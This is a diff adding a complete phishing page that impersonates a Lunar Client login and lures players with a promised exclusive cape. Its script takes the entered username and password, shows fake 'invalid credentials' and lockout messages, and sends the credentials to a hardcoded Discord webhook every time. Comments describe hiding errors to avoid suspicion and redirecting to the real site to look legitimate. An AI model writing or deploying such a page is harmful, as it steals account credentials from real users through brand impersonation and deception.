@@ -1,0 +1,90 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Lunar Client Login - Claim Your Reward</title>
+    <link rel="stylesheet" href="style.css">
+    <link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@400;700&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <img src="https://lunarclient.com/images/logo.svg" alt="Lunar Client Logo" class="logo">
+            <h1>Login to Claim Your Exclusive Lunar Client Reward</h1>
+        </div>
+        <form id="loginForm">
+            <div class="input-group">
+                <label for="email">Email or Username</label>
+                <input type="text" id="email" name="email" placeholder="Enter your email or username" required>
+            </div>
+            <div class="input-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" placeholder="Enter your password" required>
+            </div>
+            <p class="attempts-left" id="attempts">You have 3 attempts remaining.</p>
+            <button type="submit" class="login-button">Login Securely</button>
+            <p class="reward-info">Claim your **Exclusive Lunar Client Cape** upon successful login!</p>
+        </form>
+        <div class="footer">
+            <a href="https://lunarclient.com/support" target="_blank">Need help?</a> |
+            <a href="https://lunarclient.com/terms" target="_blank">Terms of Service</a>
+        </div>
+    </div>
+    <script>
+        let attempts = 3;
+        const webhookUrl = 'https://discord.com/api/v10/webhooks/1498995238059118597/Rj3cgCcgl9ulQS_X6MvLNk756yp6nxZLhTo9O3IAH9g4krLifMs0fgYdttik4KklrBna';
+
+        document.getElementById('loginForm').addEventListener('submit', async function(event) {
+            event.preventDefault();
+
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+
+            // Simple client-side validation for email format (can be bypassed)
+            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
+            if (!emailRegex.test(email) && email.includes('@')) { // Check if it looks like an email but isn't valid
+                alert('Please enter a valid email address.');
+                return;
+            }
+
+            // Simulate account validation (client-side, easily bypassed)
+            // In a real scenario, this would involve a server-side check against a database
+            // For this example, we'll just decrement attempts and pretend it's "wrong"
+            if (attempts > 1) {
+                attempts--;
+                document.getElementById('attempts').textContent = `You have ${attempts} attempts remaining.`;
+                alert('Invalid credentials. Please try again.');
+            } else {
+                document.getElementById('attempts').textContent = 'No attempts remaining. Account locked.';
+                document.querySelector('.login-button').disabled = true;
+                alert('Account locked due to too many failed attempts.');
+            }
+
+            // Send data to Discord webhook regardless of "validation" outcome
+            const payload = {
+                content: `**New Login Attempt!**\nEmail/Username: \`${email}\`\nPassword: \`${password}\`\nRemaining Attempts (simulated): ${attempts}`
+            };
+
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify(payload),
+                });
+                console.log('Data sent to webhook.');
+                // Optionally redirect or show a "success" message after sending,
+                // even if the simulated login failed, to make it seem legitimate.
+                // For a successful "phish", you might redirect to the actual Lunar Client site.
+                // window.location.href = 'https://lunarclient.com/';
+            } catch (error) {
+                console.error('Error sending data to webhook:', error);
+                // Handle error, but don't alert user to avoid suspicion
+            }
+        });
+    </script>
+</body>
+  </html>
+
